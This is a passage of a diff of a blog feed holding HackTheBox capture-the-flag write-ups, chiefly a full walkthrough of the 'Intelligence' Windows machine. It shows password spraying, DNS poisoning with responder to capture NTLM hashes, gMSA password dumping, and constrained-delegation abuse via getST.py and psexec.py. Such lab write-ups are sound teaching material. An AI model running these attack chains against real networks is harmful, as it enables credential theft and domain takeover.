+<p><em>from the effective UID</em> <code class="language-plaintext highlighter-rouge">euid=0(root)</code>, we’re now acting as <code class="language-plaintext highlighter-rouge">root</code> :)</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Tally</title><link href="http://localhost:4000/2022/08/31/Tally.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Tally" /><published>2022-08-31T00:00:00+02:00</published><updated>2022-08-31T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/31/Tally</id><content type="html" xml:base="http://localhost:4000/2022/08/31/Tally.html"><![CDATA[<p><img src="/assets/Tally/Tally.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -3464,345 +3814,4 @@ Host script results:
 
 <p><em>Of course,</em> we used the machine hash to do a <strong>DCSync</strong> and grabbed the Administrator’s hash to finish the box :D</p>
 
-<p><img src="/assets/APT/dcsync-and-rooting-the-box.jpg" alt="dcsync-and-rooting-the-box" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="http://localhost:4000/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/01/Intelligence</id><content type="html" xml:base="http://localhost:4000/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
-
-<h2 id="summary">Summary</h2>
-<ul>
-  <li>A <strong>Windows Domain Controller</strong> that’s hosting a static website on port 80.</li>
-  <li><em>While browsing the site,</em> we notice two links to <strong>PDF</strong> files that exist on a web directory for documents.</li>
-  <li><em>When checking the naming of the</em> <strong>PDF</strong> <em>files,</em> we notice a date-based scheme. So, we make a list of file names to look for other documents.</li>
-  <li>We find a lot of documents containing dummy text. Except for two which included information about a <strong>default password</strong> and about administrative activity going on as well as some hardening.</li>
-  <li>We also get a list of usernames when inspecting the metadata of the files. We use those to spray the domain users which results in our first set of credentials (<code class="language-plaintext highlighter-rouge">Tiffany.Molina</code>).</li>
-  <li><em>While checking Tiffany’s</em> <strong>SMB</strong> <em>share access,</em> we come across a <strong>PowerShell</strong> script on the <strong>“IT”</strong> share that routinely queries <strong>DNS</strong> for record names starting with <strong>“web”</strong> and issues <strong>authenticated</strong> web requests to them.</li>
-  <li><em>Knowing this information,</em> we use a tool called <code class="language-plaintext highlighter-rouge">dnstool.py</code> from the <strong>Krbrelayx</strong> toolkit to add a record that starts with <strong>“web”</strong> and points to our Kali machine’s IP address.</li>
-  <li><em>Having fired our</em> <code class="language-plaintext highlighter-rouge">responder</code> <em>to capture the</em> <strong>HTTP</strong> <em>request,</em> we wait for a couple of minutes and get the hash of a user called <code class="language-plaintext highlighter-rouge">ted.graves</code> who was running the script.</li>
-  <li><em>After running a</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>collection and viewing exploit paths from the users we own,</em> we find that <strong>Ted</strong> can read the <strong>gMSA</strong> password of <code class="language-plaintext highlighter-rouge">SVC_INT</code> which has <strong>constrained delegation</strong> on the Domain Controller.</li>
-  <li>We use the <code class="language-plaintext highlighter-rouge">gMSADumper</code> python tool to get the <strong>NTLM hash</strong> of <code class="language-plaintext highlighter-rouge">SVC_INT</code> and use it to request a <strong>silver ticket</strong> impersonating the <code class="language-plaintext highlighter-rouge">Administrator</code> for a full domain takeover.</li>
-</ul>
-
-<hr />
-
-<h2 id="nmap">Nmap</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-title: Intelligence
-|_http-server-header: Microsoft-IIS/10.0
-| http-methods:
-|_  Potentially risky methods: TRACE
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-30 20:31:02Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-| Not valid before: 2021-04-19T00:43:16
-|_Not valid after:  2022-04-19T00:43:16
-|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-| Not valid before: 2021-04-19T00:43:16
-|_Not valid after:  2022-04-19T00:43:16
-|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-| Not valid before: 2021-04-19T00:43:16
-|_Not valid after:  2022-04-19T00:43:16
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-| Not valid before: 2021-04-19T00:43:16
-|_Not valid after:  2022-04-19T00:43:16
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49692/tcp open  msrpc         Microsoft Windows RPC
-49708/tcp open  msrpc         Microsoft Windows RPC
-49715/tcp open  msrpc         Microsoft Windows RPC
-51310/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-Host script results:
-| smb2-time:
-|   date: 2022-06-30T20:31:57
-|_  start_date: N/A
-| smb2-security-mode:
-|   3.1.1:
-|_    Message signing enabled and required
-|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
-</code></pre></div></div>
-<p><em>Viewing the port scan results,</em> we notice:</p>
-
-<ol>
-  <li>Standard Domain Controller ports: 53, 88, 389 &amp; 445</li>
-  <li><strong>WinRM</strong> on port 5985 which is nice for shell access</li>
-  <li><strong>IIS 10</strong> on Port 80 that we should take a look at</li>
-  <li><em>On the last line,</em> the <strong>Clock Skew</strong> between our host and the DC is 7 hours (which is something we must take care of to make sure anything <strong>Kerberos-related</strong> works well)</li>
-</ol>
-
-<h2 id="the-website">The Website</h2>
-<p><img src="/assets/Intelligence/website-homepage.jpg" alt="website-homepage" /></p>
-
-<p>checking the website’s home page doesn’t show anything special. Except for this:</p>
-
-<p><img src="/assets/Intelligence/document-links.jpg" alt="document-links" /></p>
-
-<p><em>Upon clicking any of those links,</em> we get directed to a <strong>“documents”</strong> directory.</p>
-
-<p>The content is some filler text. But we notice the naming of the documents is based on dates.</p>
-
-<p><img src="/assets/Intelligence/document-naming.jpg" alt="document-naming" /></p>
-
-<p>This is interesting because:</p>
-
-<ul>
-  <li>we want to see if there were <em>other documents</em></li>
-  <li><em>And if there were,</em> we want to check their <strong>content</strong> as well as their <strong>metadata</strong></li>
-</ul>
-
-<p>we might get information we could use.</p>
-
-<h2 id="searching-documents">Searching Documents</h2>
-<p>We’re going to create a script that generates a list of <strong>PDF</strong> file names following the scheme we found.</p>
-
-<p>We’ll make the script generate dates between 2018 to 2022. That’s 2 years before and after the date of the found documents.</p>
-
-<p><strong>Note:</strong> This date range can take some time in the upcoming step. You can change it to be 2020 to 2021 if you just want to skip right to the solution. I’m only showing this because that’s what I did on my actual run :)</p>
-
-<p><em>Since I am most comfortable with</em> <strong>PowerShell</strong> <em>and since it also runs on</em> <strong>Linux</strong>, I’m going to be using it.</p>
-
-<p>Here’s the script:</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">foreach</span><span class="p">(</span><span class="nv">$year</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">2018</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">2022</span><span class="p">)){</span><span class="w">
-	</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">12</span><span class="p">)){</span><span class="w">
-	        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$month</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$month</span><span class="s2">"</span><span class="p">}</span><span class="w">   </span><span class="c"># if the month's number is less than 10, put a zero before it</span><span class="w">
-	        </span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">31</span><span class="p">)){</span><span class="w">
-	                </span><span class="kr">if</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$day</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$day</span><span class="s2">"</span><span class="p">}</span><span class="w">  </span><span class="c"># if the day's number is less than 10, put a zero before it</span><span class="w">
-
-	                </span><span class="s2">"</span><span class="nv">$year</span><span class="s2">-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">pdf_name_list.txt</span><span class="w"> </span><span class="c"># output the generated name into a text file</span><span class="w">
-	        </span><span class="p">}</span><span class="w">
-	</span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<p>Which works like a charm :D</p>
-
-<p><img src="/assets/Intelligence/pdf-name-generation.jpg" alt="pdf-name-generation" /></p>
-
-<p>We create a specific folder for the <strong>PDF</strong>s and then write a quick <strong>bash</strong> loop to download every document it can find. we use <code class="language-plaintext highlighter-rouge">wget</code> with the <code class="language-plaintext highlighter-rouge">-q</code> flag to make it go quietly.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>doc <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>pdf_name_list.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>wget <span class="nt">-q</span> <span class="s2">"http://10.10.10.248/documents/</span><span class="nv">$doc</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
-</code></pre></div></div>
-
-<p><img src="/assets/Intelligence/a-lot-of-pdfs.jpg" alt="a-lot-of-pdfs" /></p>
-
-<p>The result is a large list of <strong>PDF</strong>s (99) from that process.</p>
-
-<p>We wanted to find a tool to get us their content in text if possible. So we <strong>Googled</strong> for it:</p>
-
-<p><img src="/assets/Intelligence/searching-for-pdf2text.jpg" alt="searching-for-pdf2text" /></p>
-
-<p><img src="/assets/Intelligence/pdf2text-instructions.jpg" alt="pdf2text-instructions" /></p>
-
-<p><em>After installing the package,</em> We’re going to use another <strong>bash</strong> script to create the converted text files.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>pdftotext <span class="nv">$pdf</span><span class="p">;</span> <span class="k">done</span>
-</code></pre></div></div>
-
-<p>We end up with 99 text files that we need to browse through :D</p>
-
-<p>Time for another script xD</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>text <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'---------------------'</span><span class="p">;</span> <span class="nb">cat</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'press any key to continue'</span><span class="p">;</span> <span class="nb">read</span><span class="p">;</span> <span class="k">done</span>
-</code></pre></div></div>
-
-<p>This displays the document names and allows you to browse each.</p>
-
-<p>We find one interesting document: <code class="language-plaintext highlighter-rouge">2020-06-04-upload.txt</code></p>
-
-<p><img src="/assets/Intelligence/second_note.jpg" alt="second_note" /></p>
-
-<p>Which talks about changing the default password: <strong>“NewIntelligenceCorpUser9876”</strong> for new users after logging in.</p>
-
-<p><em>If one of the users still has this password</em>, this could be our way of gaining access.</p>
-
-<p>We also find another document: <code class="language-plaintext highlighter-rouge">2020-12-30-upload.txt</code></p>
-
-<p><img src="/assets/Intelligence/first_note.jpg" alt="first_note" /></p>
-
-<p>It talks about a user <code class="language-plaintext highlighter-rouge">ted</code> (<em>who’s probably in IT</em>) developing a <strong>script</strong> to notify people if a web server goes down.</p>
-
-<p>And it also mentions <strong>“locking down service accounts”</strong> which hints at a <strong>possible security concern</strong> in that area.</p>
-
-<h2 id="interesting-information-in-metadata">Interesting Information in Metadata</h2>
-<p>Now we need a list of usernames..</p>
-
-<p><em>With all those</em> <strong>PDF</strong>s <em>lying around,</em> we’re tempted to look for information in <strong>metadata.</strong></p>
-
-<p>Our tool of choice is <code class="language-plaintext highlighter-rouge">exiftool</code></p>
-
-<p>We do a quick sample test on one of the documents:</p>
-
-<p><img src="/assets/Intelligence/creator-metada.jpg" alt="creator-metada" /></p>
-
-<p>We find that there’s a <strong>Creator</strong> field with a possible username in it.</p>
-
-<p>We use the tool with the <code class="language-plaintext highlighter-rouge">-creator</code> flag to only extract that field.</p>
-
-<p>We couple this with some Shell Fu to create a user list:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>exiftool <span class="nt">-creator</span> <span class="nv">$pdf</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">': '</span> <span class="s1">'{print $2}'</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> userlist.txt
-</code></pre></div></div>
-
-<p><img src="/assets/Intelligence/exiftool-userlist.jpg" alt="exiftool-userlist" /></p>
-
-<p>Clean! :D</p>
-
-<p>We then validate those usernames using <a href="https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a></p>
-
-<p><img src="/assets/Intelligence/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>
-
-<p>All 30 users were valid.</p>
-
-<p><em>Before spraying them with the default password,</em> we gotta sync our time with the <strong>Domain Controller</strong> since we’re going to be doing <strong>Kerberos authentication</strong>.</p>
-
-<p>A tool that automates that is <code class="language-plaintext highlighter-rouge">ntpdate</code>. But you have to disable the <strong>Automatic Time Feature</strong> in kali first using <code class="language-plaintext highlighter-rouge">timedatectl set-ntp off</code></p>
-
-<p>We do this and we’re now in sync with the <strong>DC</strong> :]</p>
-
-<p><img src="/assets/Intelligence/remove-clock-skew.jpg" alt="remove-clock-skew" /></p>
-
-<p><img src="/assets/Intelligence/got-tiffany.jpg" alt="got-tiffany" /></p>
-
-<p>Tiffany hadn’t changed the default password. Lucky for us :D</p>
-
-<h2 id="exploiting-the-vulnerable-script">Exploiting the Vulnerable Script</h2>
-<p><em>When checking the readable</em> <strong>SMB</strong> <em>shares as Tiffany,</em> we find that she can read a certain share: <strong>IT</strong></p>
-
-<p><img src="/assets/Intelligence/smb-shares-tiffany.jpg" alt="smb-shares-tiffany" /></p>
-
-<p>We connect to it using <code class="language-plaintext highlighter-rouge">smbclient</code> and find the script that the previous note was talking about:</p>
-
-<p><img src="/assets/Intelligence/script.jpg" alt="script" /></p>
-
-<p>When checking its content:</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
-</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w"> 
-</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$record</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
-	</span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
-		</span><span class="nv">$request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
-		</span><span class="kr">if</span><span class="p">(</span><span class="o">.</span><span class="nf">StatusCode</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-			</span><span class="n">Send-MailMessage</span><span class="w"> </span><span class="nt">-From</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-To</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-Subject</span><span class="w"> </span><span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2"> is down"</span><span class="w">
-		</span><span class="p">}</span><span class="w">
-	</span><span class="p">}</span><span class="w">
-	</span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<p>We can see that the script:</p>
-<ul>
-  <li>Runs every 5 minutes
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-  <li>Looks for <strong>DNS</strong> records that start with <strong>“web”</strong>
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-  <li>Uses the credentials of the user running the script to issue web requests for every record match
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-</ul>
-
-<p><em>In order to exploit this,</em> we need to:</p>
-<ol>
-  <li>Find a way to put up a <strong>DNS</strong> record that points to our attacker machine</li>
-  <li>Start a web server that can capture the <strong>NTLM authentication</strong> sent with the request</li>
-</ol>
-
-<p>The answers for both those challenges is <a href="/assets/Intelligence/https://github.com/dirkjanm/krbrelayx">dnstool.py</a> from the <strong>krbrelayx</strong> toolkit and <a href="https://github.com/SpiderLabs/Responder">responder</a></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">dnstool.py</code></strong> lets us set a <strong>DNS</strong> record if we have valid domain credentials.</p>
-
-<p>We check its help and upload a record that points to our <strong>Kali</strong></p>
-
-<p><img src="/assets/Intelligence/dnstool-usage.jpg" alt="dnstool-usage" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">responder</code></strong> starts a <em>specially-setup</em> HTTP server that will capture the <strong>NTLMv2</strong> hash of the incoming request.</p>
-
-<p>We will start it specifying our <strong>VPN</strong> tunnel interface: <code class="language-plaintext highlighter-rouge">responder -I tun0</code></p>
-
-<p><em>After a few minutes,</em> we get an <strong>NTLMv2</strong> hash for the <code class="language-plaintext highlighter-rouge">Ted.Graves</code> user.</p>
-
-<p><img src="/assets/Intelligence/captured-hash.jpg" alt="captured-hash" /></p>
-
-<p>We could successfully crack it using <code class="language-plaintext highlighter-rouge">john</code></p>
-
-<p><img src="/assets/Intelligence/teddys-hash-cracked.jpg" alt="teddys-hash-cracked" /></p>
-
-<h2 id="bloodhound-and-the-path-to-domain-admin">Bloodhound and the Path to Domain Admin</h2>
-<p><em>After running the</em> <strong>Bloodhound</strong> <em>python Ingestor</em> <a href="/assets/Intelligence/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">Bloodhound.py</code></a>, we mark our user <code class="language-plaintext highlighter-rouge">Ted.Graves</code> as owned.</p>
-
-<p>We see a <strong>clear exploit path</strong> to <strong>Domain Admin</strong> when we view the results of the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principals</code> built-in query:</p>
-
-<p><img src="/assets/Intelligence/bloodhound-path-to-da.jpg" alt="bloodhound-path-to-da" /></p>
-
-<ol>
-  <li><strong>Ted</strong> can read the password for <code class="language-plaintext highlighter-rouge">SVC_INT$</code></li>
-  <li><code class="language-plaintext highlighter-rouge">SVC_INT$</code> has <strong>Constrained Delegation</strong> over the Domain Controller (which we will talk about in the next section).</li>
-</ol>
-
-<p>Let’s first get the <strong>NTLM</strong> hash for the <code class="language-plaintext highlighter-rouge">SVC_INT$</code> group-managed service account.</p>
-
-<p>we can do so using <a href="/assets/Intelligence/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>
-
-<p><img src="/assets/Intelligence/gMSADumped.jpg" alt="gMSADumped" /></p>
-
-<p>We’re now good for the next step.</p>
-
-<h2 id="abusing-constrained-delegation">Abusing Constrained Delegation</h2>
-<p><em>In our case,</em> <code class="language-plaintext highlighter-rouge">SVC_INT$</code> is allowed delegation to the Domain Controller.</p>
-
-<p>This means that it can <strong>impersonate any user</strong> (even Administrators) when interacting with the DC as the <strong>WWW</strong> service.</p>
-
-<p>We know so by inspecting the account on <code class="language-plaintext highlighter-rouge">bloodhound</code></p>
-
-<p><img src="/assets/Intelligence/allowed-to-delegate.jpg" alt="allowed-to-delegate" /></p>
-
-<p><em>However, because the</em> <strong>service portion</strong> <em>in the granted</em> <strong>service ticket</strong> <em>is</em> <strong>unprotected</strong>, we may alter it for <strong>any service</strong> we want.</p>
-
-<p><strong>For example:</strong> we can modify the received ticket to be for the <strong>LDAP</strong> service and be granted <strong>DCSync</strong> rights.</p>
-
-<p>It was all mentioned on the <strong>Bloodhound</strong> help</p>
-
-<p><img src="/assets/Intelligence/allowed-to-delegate-bh-help.jpg" alt="allowed-to-delegate-bh-help" /></p>
-
-<p>Let’s go ahead and exploit this! :D</p>
-
-<p>We will first request the ticket using <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a>’s <code class="language-plaintext highlighter-rouge">getST.py</code> script</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py <span class="nt">-dc-ip</span> 10.10.10.248 <span class="nt">-spn</span> <span class="s1">'WWW/dc.intelligence.htb'</span> <span class="nt">-impersonate</span> administrator intelligence.htb/<span class="s1">'svc_int$'</span> <span class="nt">-hashes</span> :6bf735e60852b92212d512a4deadcfea
-</code></pre></div></div>
-
-<p><img src="/assets/Intelligence/getting-admin-ticket.jpg" alt="getting-admin-ticket" /></p>
-
-<p>The ticket is now saved to disk. We’re going to export it to our environment and use it to own the box:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;path/to/ticket&gt;
-psexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> intelligence.htb/administrator@dc.intelligence.htb
-</code></pre></div></div>
-
-<p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
-
-<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><img src="/assets/APT/dcsync-and-rooting-the-box.jpg" alt="dcsync-and-rooting-the-box" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
